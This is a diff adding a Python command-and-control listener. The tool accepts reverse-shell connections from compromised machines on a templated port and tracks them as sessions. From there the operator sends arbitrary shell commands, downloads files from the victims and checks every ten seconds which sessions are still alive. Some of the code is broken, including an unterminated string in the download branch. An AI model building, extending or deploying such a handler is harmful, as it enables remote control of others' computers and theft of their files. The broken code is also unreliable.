@@ -1,0 +1,171 @@
+import os
+import socket
+import sys
+import time
+import asyncio
+import threading
+
+from threading import Thread
+from progress.bar import Bar, PixelBar
+from progress.spinner import Spinner
+
+sessions = []
+alive = True
+
+
+def transfer(conn, command):
+    conn.send(command.encode())
+    grab, src, dst = command.split("::")
+    f = open(dst, 'wb')
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4])
+            f.close()
+            print('[+] Transfer completed ')
+            break
+        if 'File not found'.encode() in bits:
+            print('[-] Unable to find out the file')
+            break
+        f.write(bits)
+    f.close()
+
+
+def die():
+    global alive
+    alive = False
+    os.system("cls")
+    spinner = Spinner("Exiting...")
+    for i in range(5):
+        time.sleep(0.1)
+        spinner.next()
+    print("\n[+] Done")
+    time.sleep(1)
+    os.system("cls")
+    os._exit(1)
+
+
+def run_server():
+    global alive
+    while alive:
+        s = socket.socket()
+        host = "0.0.0.0"
+        port = <<PORT>>
+        s.bind((host, port))
+        s.listen(10)
+        print(f'[+] Listening for income TCP connection on port {port}...\n')
+        try:
+            client, addr = s.accept()
+            num = len(sessions)
+            session = [num, client, addr, 0]
+            sessions.append(session)
+        except Exception as err:
+            print(err)
+
+
+def handle_client():
+    BACKGROUND = ['background', 'bg']
+    global alive
+    global sessions
+
+    while alive:
+        try:
+            com, *arg = input(f"Listener> ").split(" ")
+            com = com.lower()
+            arg = ''.join(arg).lower()
+            if com == "list":
+                for x in sessions:
+                    print(f"{x[0]}: {x[2]}")
+            if com == "close":
+                break
+            if com == "kill":
+                try:
+                    int_arg = int(arg)
+                    sessions.pop(int_arg)
+                except Exception as e:
+                    print("error", e)
+            if 'interact' in com:
+                comm, snum = com.split("::")
+                conn = sessions[int(snum)][1]
+                while True:
+                    try:
+                        command = input(f"[{snum}] Shell>")
+                        if '<terminate' in command:
+                            sessions.pop(int(snum))
+                            break
+                        elif command.lower() in BACKGROUND:
+                            print(f"Backgrounded: {snum}")
+                            break
+                        elif '<download in command:
+                            transfer(conn, command)
+                        elif command.strip() == "":
+                            continue
+                        else:
+                            conn.send(command.encode())
+                            print(conn.recv(1024).decode())
+                    except Exception as err:
+                        print(f"Inside Error: [{err}]")
+        except (KeyboardInterrupt, EOFError):
+            break
+    die()
+
+
+
+
+def timeout():
+    global sessions
+    while alive:
+        time.sleep(10)
+        com = "pwd"
+
+        for x in sessions:
+            try:
+                conn = x[1]
+                conn.send(com.encode())
+                resp = conn.recv(1024).decode()
+                if len(resp) > 0:
+                    continue
+                else:
+                    sessions.pop(x[0])
+            except Exception as e:
+                print(e)
+                #sessions.pop(x[0])
+
+
+def print_conn():
+    global alive
+    global sessions
+
+    holder = 0
+
+    while alive:
+        time.sleep(2)
+        if len(sessions) > holder:
+            diff = len(sessions) - holder
+            for x in range(diff):
+                print(f'\n[+] Got one {sessions[x][0]}, {sessions[x][2]}...\n')
+            holder = len(sessions)
+
+
+def run_alive(queue: list):
+    for thread in queue:
+        thread.start()
+
+
+if __name__ == "__main__":
+    queue = []
+
+    run_server_thread = Thread(target=run_server)
+    print_conn_thread = Thread(target=print_conn)
+    control_timeout = Thread(target=timeout)
+    main_server_thread = Thread(target=handle_client)
+
+    run_server_thread.daemon = True
+    print_conn_thread.daemon = True
+
+    queue.append(run_server_thread)
+    queue.append(print_conn_thread)
+    queue.append(control_timeout)
+    queue.append(main_server_thread)
+
+    run_alive(queue)
